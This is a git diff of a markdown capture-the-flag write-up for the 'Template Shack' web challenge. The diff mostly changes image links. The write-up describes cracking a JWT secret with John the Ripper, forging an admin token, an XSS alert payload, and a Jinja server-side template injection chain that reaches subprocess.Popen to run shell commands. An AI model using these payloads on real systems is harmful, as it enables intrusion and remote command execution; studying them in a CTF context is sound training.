@@ -12,34 +12,33 @@ Writeup URL: [GitHub](https://infosecstreams.github.io/csaw21/Template_Shack/)
 
 ---
 
-![AltText](./PreGame/ScreenShots/Screen Shot 2021-09-14 at 5.03.40 AM.png
-@SinDaRemedy)
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%205.03.40%20AM.png)
 
 ## Initial Research
 
 When I entered the site the first thing i noticed was the login portal. I inspected the page source, clicked on sb admin 2 to see if I'd find anyting interesting but there was nothing to be found. 
 
-![[Screen Shot 2021-09-14 at 4.11.55 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%204.11.55%20AM.png)
 
 Of course, as most of us would do, I tried to login in with the common default creds and then proceeded to look for other vectors.  Checked out the browser inspector and burpsuite  and realized there was a token in the cookies. 
 
 I made note of the server and checked for vulnerabilities for Python 3.6.9 then found [**CVE-2019-16935**](https://nvd.nist.gov/vuln/detail/CVE-2019-16935#vulnCurrentDescriptionTitle) and a weakness enumeration for XSS at [**CWE-79**](http://cwe.mitre.org/data/definitions/79.html)
 
-![[Screen Shot 2021-09-14 at 4.26.54 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%204.26.54%20AM.png)
 
-![[Screen Shot 2021-09-14 at 12.49.18 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%2012.49.18%20AM.png)
 
 Since token-based authentication doesn't require that the server know about the session data and I had a hash I figured this would be a possible attack vector. I made a file with the token and and decoded the hash with John-the-Ripper (john).  We cracked the hash and the password was "**supersecret**"
 
-![[Screen Shot 2021-09-14 at 1.22.07 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%201.22.07%20AM.png)
 
 At the same time I was also working on decoding and creating a new web token for the admin. I changed the guest to admin and entered the password in order to get my new hash.
 
-![[Screen Shot 2021-09-14 at 12.48.59 AM 1.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%2012.48.59%20AM.png)
 
 ## Initial Access/Testing
 
-![[Screen Shot 2021-09-14 at 4.31.10 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%204.31.10%20AM.png)
 
 Then it was time for the next logical step.. Let's see if this exploit actually works!
 
@@ -49,8 +48,7 @@ First thing I wanted to see is if I can get an XSS alert
 username=<Script Language="Javascript">alert("You've been attacked!");</Script>
 ```
 
-![[Screen Shot 2021-09-14 at 1.24.59 AM.png]]
-
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%201.24.59%20AM.png)
 
 Then I wanted to see if we could get a Server Side Template Injection with jinja by doing some basic math. 
 
@@ -58,7 +56,7 @@ Then I wanted to see if we could get a Server Side Template Injection with jinja
 {{7*7}}
 ```
 
-![[Screen Shot 2021-09-14 at 1.22.55 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%201.22.55%20AM.png)
 
 ## Payload 
 
@@ -76,26 +74,24 @@ Immediately after started to craft a payload with a couple of things in mind.
 {{''.__class__}}
 ```
 
-![[Screen Shot 2021-09-14 at 2.31.10 AM.png]]
-
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%202.31.10%20AM.png)
 ``` python
 {{''.__class__.__mro__}}
 ```
 
-![[Screen Shot 2021-09-14 at 3.41.32 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%203.41.32%20AM.png)
 
 ```python
 {{' '.__class__.__mro__[0].__subclasses__()}}
 ```
 
-![[Screen Shot 2021-09-14 at 2.40.48 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%202.40.48%20AM.png)
 
 ```python
 {{''.__class__.__mro__[1].__subclasses__()}}
 ```
 
-![[Screen Shot 2021-09-14 at 2.42.39 AM.png]]
-
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%202.42.39%20AM.png)
 I copied and pasted all the output in to "subclasses.txt".  cleaned up the data so that it was more manageable. 
 
 ``` shell
@@ -104,7 +100,7 @@ cat subclasses.txt| tr ',' '\n' > subclasses_new.txt
 
 Since the goal of this payload is to [execute a command through the shell](https://docs.python.org/2/library/subprocess.html#popen-constructor) I wanted to begin searching for the **Popen** class. I filtered the search in "subclasses_new.txt" for "Popen" and seen that  "subprocess.Popen" was indexed as #405 on the list (Starting with 0). 
 
-![[Screen Shot 2021-09-14 at 3.04.35 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%203.04.35%20AM.png)
 
 I confirmed that it was the indexed as 405 in the list by adding it to the to the payload. 
 
@@ -114,7 +110,7 @@ I confirmed that it was the indexed as 405 in the list by adding it to the to th
 <class 'subprocess.Popen'>
 ```
 
-![[Screen Shot 2021-09-14 at 3.33.26 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%203.33.26%20AM.png)
 
 After making note of that I continued to modify the script as shown below and test the command execution.
 
@@ -122,11 +118,11 @@ After making note of that I continued to modify the script as shown below and te
 {{[].__class__.__mro__[1].__subclasses__()[405]('ls -la',shell=True,stdout=-1).communicate()[0].strip()}}
 ```
 
-![[Screen Shot 2021-09-14 at 3.40.04 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%203.40.04%20AM.png)
 
 You can see that flag.txt is in the current directory so now all there was to do was change the command in order to retrieve the flag. So we change "ls -la" to "cat flag.txt" 
 
-![[Screen Shot 2021-09-14 at 4.06.11 AM.png]]
+![image](https://github.com/SinDaRemedy/Write-Ups/blob/CTFs/H%40cktivityCon-'21/PreGame/ScreenShots/Screen%20Shot%202021-09-14%20at%204.06.11%20AM.png)
 
 ## Victory!!
 
